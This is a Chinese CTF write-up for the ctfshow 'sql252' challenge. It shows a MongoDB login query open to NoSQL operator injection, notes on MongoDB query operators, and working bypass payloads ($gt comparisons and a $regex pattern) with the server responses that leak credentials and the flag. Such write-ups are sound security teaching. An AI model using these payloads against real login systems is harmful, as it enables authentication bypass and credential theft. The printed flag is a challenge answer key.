# ctfshow-sql252



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623

郁离歌大佬 https://blog.csdn.net/like98k/article/details/79436463

sql常见方法及udf提权   https://blog.csdn.net/qq_43645782/article/details/105468416

bit  https://www.xl-bit.cn/index.php/archives/93/





 查询语句 

```
  //sql
  db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()
```



 返回逻辑 

```
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
      

```



```sql
补充一下nosql注入笔记
http://rui0.cn/archives/609
https://www.anquanke.com/post/id/97211





$gt : >
$lt : <
$gte: >=
$lte: <=
$ne : !=、<>
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/


//查询age = 22的记录
db.userInfo.find({"age": 22});
//相当于：select * from userInfo where age = 22;
//查询age > 22的记录
db.userInfo.find({age: {$gt: 22}});
//相当于：select * from userInfo where age > 22;



mongodb的find().pretty()方法的作用。
使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。



username[$gt]=1&password[$gt]=1

{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[{"_id":{"$oid":"61824362a66168c4767ebab0"},"username":"admin","password":"ctfshow666nnneeaaabbbcc"}]}

username[$gt]=admin&password[$gt]=1
{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[{"_id":{"$oid":"61824363e45ecf03d5afc2fa"},"username":"admin1","password":"ctfshow666nnneeaaabbbcc"}]}

既不能是admin又不能是admin1 
username[$gt]=admin1&password[$gt]=1
{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[{"_id":{"$oid":"61824363cc8cb214584be83f"},"username":"admin2","password":"ctfshow666nnneeaaabbbcc"}]}

username[$gt]=admin2&password[$gt]=1
{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[{"_id":{"$oid":"61824363ae749246326ac426"},"username":"admin3","password":"ctfshow666nnneeaaabbbcc"}]}

到了admin3的时候居然出了flag 只要admin出了admin3 456..9都可以
username[$gt]=admin3&password[$gt]=1
{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[{"_id":{"$oid":"61824363aa402b6ba23576e8"},"username":"f_l_a_g","password":"ctfshow{7fb02f16-8a36-49ae-9343-e801a2462eaf}"}]}

然后也可以正则得到flag
username[$regex]=^[^a].*&password[$gt]=1
{"code":0,"msg":"\u767b\u9646\u6210\u529f","count":1,"data":[{"_id":{"$oid":"61824363aa402b6ba23576e8"},"username":"f_l_a_g","password":"ctfshow{7fb02f16-8a36-49ae-9343-e801a2462eaf}"}]}


```



























